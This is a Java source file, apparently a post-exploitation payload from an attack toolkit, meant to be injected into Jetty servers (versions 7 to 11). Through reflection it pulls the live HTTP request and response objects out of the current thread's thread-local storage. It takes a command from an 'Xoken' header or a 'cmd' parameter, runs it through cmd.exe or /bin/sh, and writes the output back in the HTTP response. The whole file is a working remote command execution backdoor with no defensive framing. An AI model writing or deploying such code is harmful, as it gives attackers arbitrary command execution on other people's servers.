package org.example.jetty.gadget;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * <p>
 * TargetObject = {java.lang.Thread}
 * ---> threadLocals = {java.lang.ThreadLocal$ThreadLocalMap}
 * ---> table = {class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;}
 * ---> [13] = {java.lang.ThreadLocal$ThreadLocalMap$Entry}
 * ---> value = {org.eclipse.jetty.server.AsyncHttpConnection}
 * ---> _request = {org.eclipse.jetty.server.Request}
 * idea_express: TargetObject.threadLocals.get("table").get("13").get("value")._request
 *
 * Vsersion test
 * 7.x、8.x、9.x、10.x、11.x
 */
public class JettyEcho {
    private static String HEADER = "Xoken";
    private static String PARAM = "cmd";
    public JettyEcho() {
        try {
            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");
            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

                Object request = null;
                Object response = null;

                // Jetty 7 低版本 org.eclipse.jetty.server.nio.SelectChannelConnector
                // Jetty 7 8  org.eclipse.jetty.server.AsyncHttpConnection
                // Jetty 9、10  org.eclipse.jetty.server.HttpConnection
                if (value.getClass().getName().contains("org.eclipse.jetty.server.nio.SelectChannelConnector")
                        || value.getClass().getName().equals("org.eclipse.jetty.server.AsyncHttpConnection")) {
                    request = getFieldValue(value, "_request");
                    response = getFieldValue(value, "_response");
                } else if (value.getClass().getName().equals("org.eclipse.jetty.server.HttpConnection")) {
                    Object channel = getFieldValue(value, "_channel");
                    request = getFieldValue(channel, "_request");
                    response = getFieldValue(channel, "_response");
                }
                if (response == null)
                    continue;

                String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, HEADER);
                String param = (String) request.getClass().getDeclaredMethod("getParameter", String.class).invoke(request, PARAM);

                String result = null;
                if (header != null) {
                    result = exec(header);
                } else if (param != null) {
                    result = exec(param);
                }

                Object writer = response.getClass().getDeclaredMethod("getWriter").invoke(response);

                try {
                    invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
                } catch (Exception e) {
                    invokeMethod(value, "getPrintWriter", new Class[]{String.class}, new Object[]{result});
                }

                return;

            }
        } catch (Exception e) {

        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

}
